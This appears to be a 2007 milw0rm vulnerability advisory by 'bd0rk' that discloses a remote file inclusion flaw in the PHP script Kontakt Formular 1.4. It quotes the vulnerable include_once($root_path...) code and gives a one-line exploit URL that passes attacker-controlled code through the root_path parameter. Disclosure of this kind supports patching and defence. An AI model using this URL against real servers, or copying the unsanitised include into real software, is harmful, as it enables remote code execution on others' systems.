@@ -1,0 +1,39 @@
+                   ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+                   +                                                          +
+                   + Kontakt Formular 1.4 Remote File Inclusion Vulnerability +
+                   +                                                          +
+                   +                  Discovered by bd0rk                     +
+                   +                                                          +
+                   ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+Vendor: http://www.mapos-scripts.de
+
+Download: http://www.mapos-scripts.de/download,5.html
+
+Vulnerable Code in /includes/function.php
+
+-------------------------------------------------------------------
+
+<?php
+@session_start();
+
+$datei_path = $datei_path ? $datei_path : $root_path."/index.php";
+$datei_path = htmlentities($datei_path);
+$kontakt_config=array();
+include_once($root_path.'/includes/config.php');
+
+-------------------------------------------------------------------
+
+[+]Exploit: http://[target]/[path]/includes/function.php?root_path=[Shellcode]
+
+
+Greetings: str0ke, TheJT, Luna-Tic, DNX
+
+
+####The 19 years old german Hacker bd0rk####
+
+Contact: bd0rk[at]hackermail.com
+
+# milw0rm.com [2007-12-30]
